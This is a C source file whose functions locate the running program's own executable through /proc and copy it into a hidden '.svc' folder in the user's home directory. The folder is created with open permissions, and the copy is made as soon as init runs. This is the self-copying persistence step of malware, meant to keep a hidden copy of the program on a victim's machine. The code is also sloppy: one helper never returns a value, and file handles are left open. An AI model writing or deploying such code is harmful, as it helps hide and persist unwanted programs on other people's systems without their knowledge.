#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <libgen.h>

#include "../header/const.h"

int _make_dir(const char* dirPath) {
    if (strcmp(dirPath, ".") == 0 || strcmp(dirPath, "/") == 0)
      return 0;
    struct stat info;
    if (stat(dirPath, &info) == 0) return 0;
    char* parent;
    char* tmp;
    tmp = strdup(dirPath);
    parent = dirname(tmp);
    if (stat(parent, &info) != 0) _make_dir(parent);
    mode_t modeSet = 0777;
    mkdir(dirPath, modeSet);
    return 0;
}

int _get_real_path(const char * buf) {
    char exe_path[MAX_PATH_LEN];
    snprintf(exe_path, MAX_PATH_LEN, "/proc/%d/exe", getpid());
    readlink(exe_path, (char *)buf, MAX_PATH_LEN);
}

int _self_copy(const char * cmd) {
    char path[MAX_PATH_LEN] = {'\0', };
    char tr_path[MAX_PATH_LEN] = {'\0', };
    char buf[1024] = {'\0',};
    ssize_t len;
    int cur_fd, tar_fd;

    if (_get_real_path(path) == -1) {
        snprintf(path, MAX_PATH_LEN, "%s", cmd);
    }
    if ((cur_fd = open(path, O_RDONLY)) == -1) {
        return -1; // can't copy now
    }

    // move to dir, creating dirs if needed.
    snprintf(tr_path, MAX_PATH_LEN,"%s/%s", getenv("HOME"), ".svc");
    _make_dir(tr_path);
    chdir(tr_path);

    sleep(1);

    tar_fd = open(FILENAME, O_CREAT | O_WRONLY, S_IRWXU | S_IRWXG | S_IRWXO);
    while ((len = read(cur_fd, buf, 1024)) > 0) {
        write(tar_fd, buf, len);
    }
    if (len == -1) {
        return -1;
    }
    close(tar_fd);
    return 0;
}

int init (const char * cmd) {
    _self_copy(cmd);
    return 0;
}
